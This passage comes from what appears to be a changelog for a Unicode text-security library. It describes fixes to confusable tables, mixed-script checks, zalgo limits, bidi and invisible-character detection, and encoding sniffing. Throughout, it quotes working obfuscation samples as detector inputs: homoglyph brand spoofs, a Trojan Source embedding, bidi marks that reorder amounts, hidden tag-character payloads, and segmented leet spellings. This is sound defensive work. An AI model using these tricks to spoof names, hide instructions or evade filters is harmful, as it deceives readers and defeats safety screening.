  `fix_case_mismatch` in `scripts/gen_confusables.py` gated on general category `Lu`, so
  two uppercase sources that are not `Lu` were never reconciled and kept TR39's lowercase
  `l` prototype: `U+2160` ROMAN NUMERAL ONE (`Nl`) and `U+1CCDE` OUTLINED LATIN CAPITAL
  LETTER I (`So`). A third case was missed entirely — the guard returned early on any
  target longer than one character, so the nine multi-character Roman numerals kept a
  lowercase spelling too.

  ```
  normalize_confusables("Ⅷ")                     'Vlll'  ->  'VIII'
  outlined alphabet U+1CCD6..U+1CCEF   'ABCDEFGHlJK...'  ->  'ABCDEFGHIJK...'
  roman numerals U+2160..U+216F     'I ll lll lV V ...'  ->  'I II III IV V ...'
  ```

- **The generator's Unicode floor sat below its own data, and corrupted digit rows
  (#439, #734).** `MIN_UNICODE_VERSION` was `16.0.0` while `DATA_UNICODE_VERSION` was
  `17.0.0`, so a regeneration under an older table passed the check, printed a warning,
  and produced a wrong result. `U+11DE0` TOLONG SIKI DIGIT ZERO and `U+11DE1` DIGIT ONE
  read as unassigned there, so `enforce_digit_target` could not protect them and they
  folded to the *letters* `O` and `l` — the exact failure #439 added that guard for. Two
  Beria Erfe capitals went unreconciled the same way.

  ```
  U+11DE0 TOLONG SIKI DIGIT ZERO        'O'  ->  '0'
  U+11DE1 TOLONG SIKI DIGIT ONE         'l'  ->  '1'
  U+16EAA BERIA ERFE CAPITAL LAKKO      'l'  ->  'I'
  U+16EB6 BERIA ERFE CAPITAL UI         'b'  ->  'B'
  ```

  A version floor is the wrong shape for this. Below the data version it permits the
  corruption it exists to prevent; equal to it, table generation is pinned to whichever
  CPython ships that UCD — for data that leads the release cycle, an alpha. The real
  requirement is that every code point the data references be *classifiable*, and that is
  now what is checked.

  New `data/ucd_backfill.tsv` carries category, digit value and decompositions for the 99
  referenced code points that CPython 3.13 reports as unassigned, generated from the
  matching UCD by `scripts/gen_ucd_backfill.py`. The generator prefers `unicodedata` and
  consults the file only on a `Cn` reading, so a newer interpreter is always authoritative
  and the file can never mask it. Generation now produces byte-identical tables under
  CPython 3.13, 3.14 and 3.15.

  Two guards, because the obvious one has no teeth where it runs: the backfill must cover
  every referenced code point the running interpreter cannot classify — checkable on any
  interpreter, and the assertion that bites on CI — and its values must agree with
  `unicodedata` wherever the interpreter knows them, which skips explicitly rather than
  passing vacuously when it can verify nothing.

  Twenty-two rows change in total: 15 in `confusables_to_latin.tsv`, 5 in
  `confusables_to_cyrillic.tsv`, and 2 added to `confusables_digit_tr39.tsv`. This moves
  the output of `normalize_confusables`, `canonicalize`, `search_key`, `catalog_key` and
  `sort_key` for those code points, so a stored key built from one of them no longer
  compares equal to a freshly computed one.

  Lowercase Roman numerals are untouched, the small capitals keep their lowercase targets
  (`U+026A` is `Ll` and correctly folds to `i`), `U+042B` correctly keeps `bl` because
  TR39 is a visual mapping, and `U+3392` SQUARE MHZ is untouched because its NFKC form is
  mixed case.

  Guarded by a new block-consistency assertion in `tests/test_confusable_coverage.py`:
  every ASCII-letter target within an uppercase block must agree on case. It reads only
  the generated table and never calls `unicodedata`, so it cannot be silently skipped by
  an interpreter whose Unicode version predates the data.

### Fixed

- **Three surfaces answered "is this mixed script?" three ways (#776).** UTS #39 §5.1
  augmented script sets treat Han + Hiragana + Katakana as one writing system.
  `inspect_anomalies` applied them; `is_mixed_script` and the hostname path did not.

  | input | detector | `is_mixed_script` | hostname |
  |---|---|---|---|
  | `例え` | clean | **mixed** | **suspicious** |
  | `日本語テスト` | clean | **mixed** | **suspicious** |

  So **every Japanese domain name was reported as a spoof**, by a check the anomaly
  detector called clean on the same input.

  `is_mixed_script` and the hostname path now share one resolver — an `AugmentedState`
  fed either a character walk or a script list — rather than two implementations that
  agree by inspection. Han + Hangul resolves to Korean and Han + Bopomofo to Chinese, for
  the same reason.

  `inspect_anomalies` does not share that resolver and keeps its own wider policy, which
  is why the three surfaces now agree on the question this is about without being
  identical.

  The sets narrow the answer; they do not remove it. `ひら한` is Japanese beside Korean,
  which share no augmented set, and `例えa` is Japanese beside Latin — both still mixed,
  and the second is the shape the rule exists for.

  One difference is left and is now a stated policy rather than an accident:
  `inspect_anomalies` also exempts CJK beside Latin, because it runs over prose where a
  Japanese sentence carrying a Latin product name is ordinary text. A *label* doing that
  is not, so the predicate and the hostname screen still flag it.

  Two tests had frozen the old behaviour — one asserted "Japanese text mixing Han and
  Katakana IS multi-script", which is the contradiction rather than a property of the
  text. Both are inverted with the reason.

- **`canonicalize_strict` was not idempotent when a cross-script mark split a mark run
  (#862).** The zalgo cap ran at step 3 and `ConfusablesMarkFixedPoint` — which carries
  the #615 cross-script mark strip — at step 4. So a mark whose own script differs from
  its base split a run for the *count*, was then deleted, and the runs merged for the
  next pass:

  ```text
  canonicalize_strict("a" + U+0308*3 + U+0489 + U+0308)  ->  four marks
  canonicalize_strict(that)                              ->  three
  ```

  This is #121's rule one step wider than #850 applied it. #850 moved `sort_key`'s cap
  after the zero-width strip and gated on that step; the cross-script mark strip is a
  **third** character-removing step, and the one that removes marks specifically.

  Two gates now, because one shape cannot cover it. The source-order gate keeps checking
  the step list, and deliberately does **not** list `ConfusablesMarkFixedPoint` — that
  step removes marks only in strict mode, and the list cannot see a mode, so including it
  would fail `canonicalize` for a bug it does not have. `no_pipeline_truncates_further_on_a_second_pass`
  asks the pipelines instead: four splitters (zero-width, CGJ, ZWJ, cross-script mark)
  against four builders at every run length. It is weaker about *why* and stronger about
  *whether*, which is the pair #121 needs.

  The key-stability corpus gained six rows placing a cross-script mark inside a mark run,
  taking it from 22,971 to 22,977. It expressed every character involved and never that
  arrangement, so this change's fixture diff would have been 0 rows — the same blind spot
  #850 found one class over. With the rows present the diff is **1 row**, in
  `canonicalize_strict` only.

- **The ruff version was pinned in two files and nothing checked they agree.**
  `pyproject.toml`'s `dev` extra and `.github/workflows/ci.yml` each carry a
  `ruff==` pin, and the pre-commit hooks are `language: system` — they run whichever
  `ruff` is on PATH. So a stale local ruff passes every local gate and fails CI, with
  nothing in the failure pointing at a version.

  It is a sharper trap than a version skew usually is: **0.16 formats Python inside
  Markdown fenced blocks and 0.15 does not**, and this repository's docs carry executable
  Python in fences. A branch passed `ruff format --check .` on 0.15.17 and failed the
  *Lint & format* job on 0.16.4, over comment alignment inside two guide pages.

  Both pins move to **0.16.5**, and `tests/test_toolchain_pins.py` now asserts three
  things: the two pins agree, the pin is at least 0.16 (below that the Markdown blocks
  stop being formatted, which fails nothing), and the ruff actually on PATH matches —
  skipped when ruff is absent, since a runner without the `dev` extra is legitimate.
  CONTRIBUTING.md gains the one-liner that installs the pinned version.

- **`sort_key` was not idempotent when an invisible split a mark run (#850).** #843 added
  the combining-mark cap to `sort_key` as step 4b, before the `StripControl` /
  `StripZeroWidth` pair at step 5. A zero-width between two marks therefore survived into
  the count and split one run into two short ones, neither over the cap; the strip then
  deleted it, the runs merged, and the *second* pass truncated what the first had kept.
  `sort_key("\u0301\u0301\u0301\u200b\u0301")` returned four marks and `sort_key` of
  that returned three.

  `canonicalize` has ordered the same two steps correctly since #121, under a comment
  that states the rule outright — "Runs AFTER the control / zero-width strip above so a
  stripped invisible between two marks cannot split a mark run and hide the count" — so
  the fix is to move the step, not to reason about it again. `canonicalize` and
  `canonicalize_strict` were never affected.

  Two gates now hold the rule rather than the comment. `every_zalgo_cap_runs_after_its_invisible_strip`
  reads the source and checks the ordering in every pipeline that caps marks, including
  ones not yet written; `Step::Zalgo(0)` is exempt, because a cap of zero removes every
  mark whatever the run structure, and `zalgo_zero_is_order_independent` checks that
  exemption is real. Separately, the key-stability corpus gained eight rows putting an
  invisible *between two combining marks* — a class it could not express, so #843's
  fixture diff was 0 rows of 22,963 and the gate built to answer "did key output move"
  reported nothing. With the rows present the diff for this change is 4 rows.

- **`is_zalgo` flagged 142 ordinary Burmese place names, and `strip_zalgo` deleted a tone
  mark from each (#842).** `မြို့` is one syllable — a base consonant, a medial, two vowel
  signs and a tone — and that is how Burmese is written. `canonicalize` carried the
  truncation into a key.

  #788 fixed the *disagreement* between the cap and the threshold by raising the cap to 3.
  It did not ask whether 3 is right, and for Myanmar it is not. Raising it to 4 would clear
  this corpus and stop nowhere principled: Burmese takes a second medial, so more of the
  language pushes it up again, and each raise costs detection at the top end for every
  other script.

  The discriminator is not the count, it is **canonical combining class**. A mark of class
  0 is positioned by the renderer — Burmese vowel signs and medials, Indic matras, Thai
  vowels — and does not stack. Zalgo is many marks at *one* position, which means many
  marks of one non-zero class. Both `is_zalgo` and `strip_zalgo` now count per class.

  Interleaving classes does not evade it, and not by a rule: NFD canonically reorders marks
  by class, so `("\u0301" + "\u0323") * 10` sorts into ten of each and reads as a run of ten
  either way. The normalization does the work.

  Measured over the corpus: **142 false positives → 0**, with every zalgo form still
  caught. One semantic change to note — `max_marks` now bounds marks at one *position*, so
  a base can carry more than that in total: a mark above and a mark below are two
  positions.

  `max_marks == 0` keeps its old meaning and is the one case the class rule does not
  apply to. It is documented in three places as stripping **all** combining marks and
  being equivalent to `strip_accents`, and `strip_obfuscation` is built on it. A
  threshold of zero is not a judgement about stacking, so exempting class 0 there would
  have let a Thai vowel or a Sinhala matra survive maximum-strength deobfuscation —
  measured at 38 corpus rows before the exception was added. `strip_obfuscation` output
  is unchanged from 0.14.1.

- **`perf-gate.yml` has never run on `main` (#832).** It triggers on `push` as well as
  `pull_request`, and two of its three jobs computed the baseline as
  `git merge-base origin/${{ github.base_ref }} HEAD`. `github.base_ref` is the target
  branch *of a pull request* and is empty on a push, so the command became
  `git merge-base origin/ HEAD` and the step died with `fatal: Not a valid object name
  origin/` before benchmarking anything. Measured over the last 60 runs: 44 `pull_request`
  runs all successful, **13 push runs all failures**. A comment in the same file said
  "Pushes to main always run it, so nothing reaches a release unmeasured" — true of the
  trigger, and false of the measurement.

  The third job had the correct branch all along, under a comment naming this exact case,
  which is why the fix is to compute the baseline **once** and export it rather than to
  repeat the conditional twice more: the right answer was already twelve lines from both
  wrong ones. `tests/test_workflow_baselines.py` holds it — no workflow that runs on
  `push` may read `github.base_ref` without first establishing the event.

- **A dispatched per-registry patch release could not build (#830).** `RELEASING.md`
  documents a lane for "a packaging bug in the gem, a wrong type in the npm package" — a
  point release in one ecosystem only. Dispatching `publish-node.yml`, `publish-ruby.yml`
  or `publish-java.yml` on `main` skips the `[patch.crates-io]` redirect by design,
  resolves the published core, and dies at the first API the published core does not have.

  `wait-for-core` did not catch it. It polls the sparse index for **any** non-yanked
  `0.MINOR.*` and stops there, so `0.14.1` — which had existed since the release —
  satisfied it in one request. The job proves a version *exists*; it never proved the glue
  could build against it.

  Between releases it usually cannot, and that is ordinary rather than a defect: a core
  API and the glue that uses it land in one commit, so from that commit until the next
  release the glue needs a core that is not published yet. #830 measured one missing
  field. Reproduced on `cadd616` it is four core items and every binding — node 3 errors,
  Ruby 4, Java 4 — because the gap widens with each core API that lands mid-cycle.

  `wait-for-core` now compiles the glue against the published core after the poll, with no
  redirect, and refuses with the reason and the two ways forward: dispatch on a release tag
  whose glue and core shipped together, or release the core first. `RELEASING.md` rule 2
  says the lane is conditional rather than always available, and the two manifest comments
  that asserted the disproved property — "the shipped manifest builds against the PUBLISHED
  core" — now say *at a release boundary*.

- **The key-stability corpus could not express the classes most likely to move a key
  (#806).** The golden-key fixture is the gate that catches key-output drift, and its
  174,880-character corpus contained **zero noncharacters and zero soft hyphens**, with one
  tag character, one variation selector and two PUA code points between them — three
  categories its own README named as covered.

  That is not a thin spot, it is a blind one. #805 is a live key evasion using a
  noncharacter, and measured against the old corpus its fixture diff would have been
  **0 rows of 22,878**: the gate built to answer *"did key output move, and was that on
  purpose"* would have reported nothing about the change that closes it. 85 rows now carry
  noncharacters at each edge and inside a word, soft hyphens in four words, and thicker
  coverage of PUA, tags, variation selectors, ZWSP, word joiner and the BOM — each beside
  a clean control, so a later diff shows the two keys converging rather than one key
  appearing.

  `tests/test_key_stability.py` asserts a floor per class rather than the README
  paragraph, so adding rows stays free and losing a class fails.

- **"Escapes, never literals" now covers the tree, not just `README.md` (#802).** The
  README guard's docstring already made the argument, and recorded that the defect it
  guards against **shipped once** — a literal `U+202E` in a README example reached GitHub,
  crates.io and PyPI reading as a tautology. Everything that argument says about
  `README.md` was true of every other file, and nothing checked them.

  Measured on `main`: 330 literal invisible characters across 481 files in 14 languages,
  103 of them bidi controls — the mechanism of CVE-2021-42574, in the repository of the
  library that detects it. The sharpest were the Trojan Source test constants themselves,
  stored with literal `U+202E`, so what a reviewer saw in an editor, in `git diff` and in
  the GitHub blob view was the *reordered* form rather than the one Python parses. A
  construction whose entire point is that display order and logical order disagree was
  stored in the form that disagrees.

  All of them are now escapes. The Python conversion is proven by AST equivalence — a
  rewrite that changed any string constant changed `ast.dump` and was reverted rather than
  committed — which is what made it safe to run over test data whose exact bytes are the
  point. The other languages were verified by their own suites: 224 rspec examples, 194
  vitest tests, `gradlew` BUILD SUCCESSFUL, 39 Sybil doc pages, `mkdocs build --strict`.

  Two exemptions, both mechanical rather than judgement calls, and both stated in one
  reviewed list rather than in per-file pragmas. A `U+200D` joining two
  `Extended_Pictographic` code points is emoji sequencing — `docs/user-guide/graphemes.md`
  alone holds 43, and escaping them makes the page worse without making anything safer.
  And a `U+200D`/`U+200C` between two letters of a joining script is **orthography**: this
  one was not in #802's classification and was found by converting, when
  `docs/reference.md`'s Sinhala sample `ශ්‍රී ලංකා` and the Persian ezafe in
  `docs/user-guide/abjad-transliteration.md` turned out to need their joiners to be the
  language. The emoji rule alone would have broken both, which is exactly the "gate becomes
  a nuisance" outcome #802 §3 warns about. A joiner between Latin letters — `ad\u200dmin` —
  gets no exemption and stays a failure.

  `.gitattributes` is added as the reviewer-side signal #802 §5 asks for: `eol=lf` so a
  CRLF checkout cannot change what a test asserts, `binary` on the byte-exact fixtures, and
  `linguist-generated` on the tables so a regeneration does not bury the change that caused
  it. `working-tree-encoding` is deliberately not set — it rewrites bytes on checkout, and
  these files are byte-exact test data.

- **A confusable mapping on a cased letter now implies one on its case pair (#801, #715).**
  The table carried `Т` (U+0422 CYRILLIC CAPITAL TE) → `T` and nothing for `т` (U+0442),
  the lowercase it case-folds to. That was invisible while hostname analysis ran on
  whatever spelling arrived; #797 made the analysis run on the form the name resolves to,
  and UTS #46 case-folds every label — so both spellings converged onto the **unmapped**
  one and `Т.com` stopped being flagged. DNS lowercases, so the unmapped side is the side
  that resolves.

  The cause was in the generator, not a missing hand-written row. TR39's prototype for
  these classes is a Latin **small capital** rather than the ASCII letter — `т` maps to
  `ᴛ` U+1D1B, `н` to `ʜ` U+029C — and `ASCII_FOLD` was applied *after* the script gate, a
  list of block ranges that does not cover Phonetic Extensions. Membership in that map is
  itself the claim that the prototype is a Latin letter with an ASCII representative, so
  it is resolved first now. `ASCII_FOLD` also gained `LATIN LETTER SMALL CAPITAL X` → `x`
  derived from the UCD name, and was closed under case pairing — it was itself asymmetric
  in fourteen of thirty-two entries, carrying `Ɔ` without `ɔ` and `ƨ` without `Ƨ`.

  44 rows added, none removed or re-pointed; the Latin table goes 2,220 → 2,273. Of the 30
  pairs where upstream lists the lowercase and disarm dropped it, 24 are closed. Seven
  asymmetric pairs remain table-wide — the number the gate enforces — every one because
  the unmapped half's own upstream prototype is Greek (`χ`, `λ`, `Γ`), Cyrillic (`л`) or a
  math symbol (`∂`). Folding those needs a transliteration decision, not a homoglyph one.
  (Six of the seven fall in the 30 above; the seventh runs the other way, a Cherokee
  *lowercase* that is mapped while its capital is not, because that capital's prototype is
  Greek gamma.) `tests/test_confusable_case_pairs.py` asserts the rule against the table
  itself and pins that count, so a future refresh that reopens the asymmetry fails rather
  than widening it.

  **This also closes #715.** Its 16 dropped Cherokee sources, `U+AB70` included, come back
  through the same mechanism, so the answer to "should they be folded" is yes, and it is
  answered here rather than separately.

- **`rust-version` is derived from the resolved tree rather than asserted (#718).** See the
  upgrade note above for the correction itself. `tests/msrv_declared.rs` computes the floor
  from `cargo metadata` intersected with `cargo tree -e no-dev` and fails when the manifest
  publishes anything lower. Scoped to the runtime graph on purpose: a dev-dependency's
  floor never reaches a downstream consumer, so `criterion` cannot raise the published
  MSRV on its own. An earlier draft of this gate passed `std::env::consts::ARCH` to
  `--filter-platform`, which cargo rejects — the call failed, the test took its
  unavailable branch, and the gate went green while the manifest published a floor nothing
  could build at. There is now a test asserting the gate actually ran.

- **`is_multiple_of` in `src/encoding.rs`.** Raising the MSRV unlocked a clippy lint that
  the old floor had suppressed.

- **`strip_accents` in batch form inverted 45 mathematical relations (#822).** The batch
  function did not call `strip_accents`. It restated the algorithm as
  `nfd().filter(|c| !is_combining_mark(c)).nfc()` — precisely the stateless filter that
  `strip_accents_into`'s own comment rules out, because whether a mark is strippable
  depends on the base it sits on (#749). So the batch path deleted the negation overlay
  the single path keeps: `strip_accents(["≠"])` returned `["="]`, `∄` came back as `∃`,
  `∉` as `∈`. A relation and its negation are not the same character with an accent.

  `_strip_accents_batch` now delegates and keeps only what a batch function should own —
  the boundary crossing, the released GIL, the ASCII fast path — plus one reusable buffer
  across the batch, as the pipeline does (#236). The other three batch functions were
  audited and all already delegate; this was the only one that had gone stale against a
  fix to its single path.

  Found by `tests/test_batch_consistency.py`, which is Hypothesis-marked and so never runs
  in CI — it failed only in developer worktrees, and only when the shrinker happened to
  reach one of the 45. `tests/test_batch_delegates.py` is the deterministic half: it
  derives the negation set from the UCD and asserts batch-equals-single for all four batch
  functions. Verified it fails 46 tests against the old implementation.

- **Enclosing marks, and the bidi marks that reorder (#724, #741).** Two classes the
  detector spared on grounds that do not hold.

  **#724 — the count was measured and the category never was.** One enclosing mark per
  base is below every threshold disarm has: `is_zalgo` fires above three, `strip_zalgo`
  keeps two (#429's decision, and the right one — Vietnamese `ệ` is two marks in NFD). So
  a string where every letter carries a `COMBINING ENCLOSING CIRCLE` was clean at every
  surface, while `strip_obfuscation` removed it:

  ```
  I⃝g⃝n⃝o⃝r⃝e⃝    is_zalgo False   inspect_anomalies []   ->  enclosing_mark  U+20DD ×6
  ```

  For an enclosing mark the category *is* the signal: no `Me` mark is an accent, and
  nothing legitimate encircles every letter of a word. It gets its own kind rather than a
  `zalgo` finding, because it is a different fact — not "too many marks". Two exemptions,
  both measured: a keycap sequence (`1️⃣` is `1` + `U+FE0F` + `U+20E3`, and the variation
  selector is what makes it RGI — the same distinction the subdivision-flag allowlist
  draws), and Cyrillic `Me` on a Cyrillic base, which is historic notation. A single mark
  is not a finding; two are needed.

  **#741 — two spared bidi marks still reorder rendered text.** Measured against UAX #9
  with `unicode-bidi`, inside otherwise pure-Latin prose:

  ```
  Transfer <RLM>100 200 300 to Bob   renders   Transfer 300 200 100 to Bob   ->  bidi
  acct <ALM>4321-9876                renders   acct 9876-4321                ->  bidi
  ```

  That is Boucher et al., *Bad Characters* (arXiv:2106.09898v2) Table I, reached with a
  control the detector did not report. The predicate is the narrow one #741 §2 suggests —
  a spared mark immediately before a run of European numbers, in a majority-Latin context
  — because that is the construction that reorders, and it fires on neither RTL prose nor
  a hashtag. `LRM` stays spared: the same measurement found it produced no reordering over
  any carrier tried, so the finding is `RLM` and `ALM`, not "the spared set is wrong". The
  `RLE` row the issue lists was already closed by #643.

  The *Spared* column in `docs/user-guide/anomaly-detection.md` is corrected (§4). It read
  as a statement that these controls are safe rather than that they were not yet screened.

  **`canonicalize` is unchanged, deliberately (#724 §3).** Stripping `Me` there would not
  weaken #429 — no enclosing mark is an accent — but it moves output for 13 code points,
  which is a `### Changed (breaking)` entry and a decision of its own rather than a side
  effect of adding a detector rule. The asymmetry with `strip_obfuscation` is written up
  where the accent-preserving decision is explained, and asserted in the tests.

- **The detector consults the confusable table (#737), including the punctuation it
  produces (#719), and the whole-token exemption is per block (#722).**

  `canonicalize` has two steps that put ASCII into its output the input did not carry:
  the leading NFKC, and the confusable fold. #633 wired the first in as `compat_fold`.
  The second is the **largest body of data disarm ships**, and the aggregate detector
  never consulted it:

  ```
  is_confusable("pɑypal")   True
  canonicalize("pɑypal")    'paypal'
  has_anomalies("pɑypal")   False   ->  True, kind `confusable`
  ```

  The slice with no compatibility decomposition is also single-script, so `mixed_script`
  could not see it either. `detail` names the impersonated letter the way `mixed_script`
  names the two scripts: `ɑ (U+0251) folds to a`.

  **#719 — the punctuation half.** `U+2236 RATIO` has no decomposition at all and reaches
  `:` only through the fold; `U+2044` reaches `/`, `U+2216` reaches `\`. 232 code points
  reach ASCII by the fold alone, 76 producing one of `: = % & ? # / \`. `U+00BD` is the
  case the issue calls subtle: its NFKC is `1⁄2`, whose middle character is not ASCII, so
  the `compat_fold` gate is false — and the `/` appears only when the fold reaches that
  `U+2044` one step later. Neither step alone sees it; the composition does.

  **#722 — the exemption was calibrated on one block and applied to twelve.** #633 spared
  a token spelled *wholly* in a compatibility form, because `ｐａｙｐａｌ` cannot be told
  from `ＮＨＫ` by character class. Sound for fullwidth; not for Mathematical
  Alphanumerics, where 652 code points spell a whole word that folds to plain ASCII and
  reported clean. The exemption is now per block — fullwidth, CJK Compatibility,
  Letterlike, the phonetic blocks and Enclosed Alphanumeric Supplement keep it;
  Mathematical Alphanumerics and Enclosed Alphanumerics do not. `ＮＨＫ`, `㎏` and `№`
  stay spared; `𝐩𝐚𝐲𝐩𝐚𝐥` and `ⓟⓐⓨⓟⓐⓛ` now report.

  All three take #633's gate unchanged — the word must also carry an ASCII letter — so
  the false-positive analysis carries over: `Привет` and `Ελλάδα` stay clean, which is the
  over-flagging #545 removed from `is_suspicious_hostname`. Judged per **word**, not per
  token, so `IT-специалист` and every IDN URL stay clean too (#702). And the `UNITS`
  exemption the mixed-script branch already had is reused: the micro sign *is* how a
  microfarad is written.

  `CVE-2019-19844`, `CVE-2017-7832`, `CVE-2017-5383` and `CVE-2019-11721` move to
  *detected* — the four homoglyph CVEs the confusable table was built for. `has_anomalies`
  reports 29 of the 46, up from 25.

  The `canonicalize` warning on every binding now says that the fold, not only NFKC, can
  introduce ASCII punctuation (#719 §4), and the `has_anomalies` docstring says the table
  is consulted (#737 §4).

- **The two lexicon-gated branches compose, and know every separator (#726, #750, #752).**
  Three blind spots in `src/anomalies.rs`, each one character wide, each in a branch that
  worked correctly on the input it was designed for.

  **#752 — one leet substitute inside a segmented word defeated both branches.**
  `inspect_anomalies` catches leet substitution. It catches single-letter segmentation. It
  reported **clean** on a token that does both:

  ```
  p4ssw0rd           leet          -> password
  p.a.s.s.w.o.r.d    segmentation  -> password
  p.4.s.s.w.0.r.d    clean         ->  segmentation -> password
  ```

  `seg_word` rebuilt the candidate with `filter(is_alphabetic)`, so `4` and `0` were
  silently *dropped* rather than demangled — `psswrd` is in no lexicon. Every
  substitutable position in `password` screened clean — `a`, both `s`, and `o`, which are
  the four letters `leet_sub` has an inverse for. The rebuild now demangles.

  **#750 — the separator set was three characters.** Unicode has two whole general
  categories for joining parts of one word, and 16 of the 36 joiners were silent on every
  path. `U+2E40` and `U+30A0` are the sharp ones: `canonicalize` rewrites them to `=`,
  which was not recognised either, so the fold moved the attack from one unrecognised
  separator to another. `U+2010 HYPHEN` and `U+002D HYPHEN-MINUS` render identically and
  disagreed.

  New table `src/tables/data/word_joiners.tsv`, derived from `General_Category` by
  `scripts/gen_word_joiners.py` rather than curated, so a Unicode release that adds a dash
  cannot leave a hole. 38 code points at UCD 17.0.0 — 27 `Pd`, 10 `Pc`, and `U+002E` by
  hand, because widening the test to `Po` would pull in `?`, `!` and `@`.

  **#726 — `!` is in `WRAP` and in the leet alphabet at once.** `core` is trimmed before
  the leet branch runs, so a leet word starting with one lost it before the decode:
  `1gn0r3` was caught and `!gn0r3` was clean. Now: trim, decode, and on a miss retry with
  the edges kept. The retry runs second, so the trim keeps doing its real job — the
  trailing `!` in `4dm1n!` is still punctuation.

  Two of #726's rows stay clean and that is correct: `!` maps to `i`, so `gn0r3!` decodes
  to `gnorei` and `!dm1n` to `idmin`, neither of which is a word. Asserted, so the
  distinction is recorded rather than read as an unfixed defect.

  All three density gates are unchanged — `seps >= 2`, the `5:3` ratio, and the
  single-letter-fragment requirement — which is the acceptance criterion for this change
  rather than a side note.

- **The detector sees every carrier the strip functions already remove (#700, #643).**
  `inspect_anomalies` could not see two of the three ASCII-smuggling channels at all, and
  saw the third only when a letter happened to sit next to it — so on the exact carriers
  #413 was opened for, the sanitizer closed the channel and the detector reported the
  text clean:

  ```
  "Hello world" + 21 Tags chars spelling `tracked-by:acct-99213`   clean  ->  invisible
  "Hello " + 2 variation selectors carrying `hi` + " world"        clean  ->  invisible
  "Hello " + 16 ZWSP/ZWNJ spelling `hi` + " world"                 clean  ->  invisible
  ad<U+3164>min      (renders as `admin`)                          clean  ->  invisible
  ```

  Two independent gates, both load-bearing. **The carriers were not in the table** — the
  detector kept its own eight-character list while `src/invisibles.rs` already had a
  predicate for every class and `strip_*` already acted on them. It now reuses those
  predicates, so the detector and the sanitizer cannot drift, which is the failure the
  issue is about. **And a listed character still needed a letter beside it** — the
  neighbour rule reads one whitespace token, so a run standing between two spaces could
  not fire even for a character that was listed. A run rule now fires on its own, at one
  tag character, two variation selectors or eight zero-width, and the finding names the
  **run**: `U+200B ×16`, not `U+200B`.

  Soft hyphen and CGJ are carriers for the run rule only. Both have a legitimate use
  between letters, which is exactly where the neighbour rule fires; nine in a row is
  neither hyphenation nor a normalization boundary.

  The exemptions that distinguish this from "flag every invisible" are unchanged and
  tested: emoji ZWJ sequences, Persian ZWNJ, Latin-plus-CJK, emoji presentation selectors,
  and the three RGI subdivision flags — for which the detector reuses `invisibles`' own
  allowlist rather than matching on the region-subtag shape.

  Two findings not in either issue. `ad<U+180E>min` reported as **`mixed_script`**: U+180E
  sits in the Mongolian block, so the detector named a script nobody can see — the same
  defect #605 fixed for `is_suspicious_hostname` by stripping invisibles before script
  analysis, which the detector never got. And `bidi_spares_marks_and_embeddings`
  documented a condition it did not implement — "an LRE..PDF embedding around RTL text
  (*no Latin majority*) is benign" — so `\u202Bif (isAdmin) { grant(); }\u202C` was spared
  too, the Trojan Source construction with the older embedding operators in place of the
  isolates. Embeddings now take the same majority-Latin condition the isolates already
  had; bare `LRM`/`RLM` stay spared.

  #643 §2 asks whether the key builders' treatment of `U+2800` and `U+1680` is arbitrary.
  Measured, it is not, and the answer is recorded as an assertion rather than left to be
  rediscovered: the four Hangul fillers collide with `admin` because NFKC or
  `transliterate` **deletes** them, while `U+2800` and `U+1680` resolve to a **space**, so
  `ad<X>min` becomes `ad min` — genuinely different text, and the same answer an ordinary
  space gets. `U+1680` stays undetected for the same reason: it is `Zs`, a token separator
  everywhere in this library, so it can never be inside the token the neighbour rule reads.

  `CVE-2025-32711` moves from *Neutralized* to *Neutralized + detected* in the validation
  matrix — it was the one row on the "why nothing flags it" list that was a character you
  could look for.

- **A token is not a word, and the detector now knows the difference (#702, #720).**
  `split_tokens` bounded a token on `char::is_whitespace` and nothing else, which produced
  a false positive and a false negative from the same line.

  **#702 — a hyphen did not end a token**, so ordinary multilingual text reported
  `mixed_script` with a finding byte-for-byte identical to a real homoglyph attack:

  ```
  раypal                  mixed_script  "Cyrillic and Latin"   <- the attack
  IT-специалист           mixed_script  "Latin and Cyrillic"   -> clean
  Сбербанк-Online         mixed_script  "Cyrillic and Latin"   -> clean
  β-carotene              mixed_script  "Greek and Latin"      -> clean
  https://пример.рф/path  mixed_script  "Latin and Cyrillic"   -> clean
  ```

  A caller could not tell them apart. `раypal` is an attack *because* the two scripts sit
  inside one word with no boundary to hide behind; `IT-специалист` is two words and the
  hyphen is the boundary. The mixed-script and bidi-mixed branches now ask their question
  per **word**.

  **#720 — an exotic space did end one**, so `Ign<U+200A>ore` was two ordinary tokens
  rather than one suspicious one, and the fragmentation was invisible by construction. All
  nine `Zs` separators now report `segmentation`. This is the word-fragmentation subtype
  of arXiv:2508.14070v1 §3, which measured 0/10 detected.

  The two pull in opposite directions — #720 says so outright — and the resolution is that
  different branches want different boundaries. Structural whitespace ends a token; a
  hyphen, slash, colon, `@` or exotic space ends a *word*; and the segmentation branch
  sees the token whole, because there the separators are the evidence. The leet branch
  gets a third, narrower set: `@` and `$` are letter-substitutes, so `p@ss` is one word,
  and the apostrophe stays out because `d0n't` must still decode.

  **`canonicalize` is unchanged, deliberately (#720 §1).** Deleting a word-internal exotic
  space would rejoin the fragments, and would also break `Mr.<U+00A0>Smith`,
  `10<U+00A0>km` and the `1<U+202F>234` thousands separator. Only a lexicon separates
  those from an attack, and `collapse_whitespace` has none — the `segmentation` branch
  does, which is why the fix lives there. Recorded as an assertion rather than left
  implied.

  One consequence worth naming: every `Zs` folds to `U+0020` under NFKC, so once the
  exotic spaces stayed inside a token, #633's `compat_fold` branch fired on
  `Mr.<U+00A0>Smith`. Whitespace is now excluded from that trigger — a space folding to a
  space is not "spelled half in a compatibility form and half in ASCII", which is the
  shape that branch exists for.

- **`detect_encoding` reports UTF-16 (#710).** It could not return a UTF-16 label for any
  input: chardetng does not guess UTF-16, and nothing looked for a BOM before it ran. So
  the two encoding functions disagreed on the same bytes, silently, and only one of them
  was right:

  ```
  detect_encoding("héllo wörld".encode("utf-16"))   ('KOI8-U', 0.95)  ->  ('UTF-16LE', 0.95)
  decode_to_utf8(same bytes)                        'héllo wörld'         'héllo wörld'
  bytes.decode(that label)                          'ЪЧh\x00И\x00l\x00…'   'héllo wörld'
  ```

  A caller following `detect_encoding`'s own advice — *"prefer explicit encoding metadata
  over detection"* — carried the label to another decoder and got mojibake, at the highest
  confidence the API can express. A BOM is not a probabilistic signal, so this was never
  the ambiguous-bytes case the encoding tests scope out.

  Both deterministic cases are now decided before chardetng runs:

  - **A BOM**, via `Encoding::for_bom` — the same WHATWG sniff `decode_to_utf8` already
    performs internally, so the two agree by construction rather than by a second
    implementation that could drift.
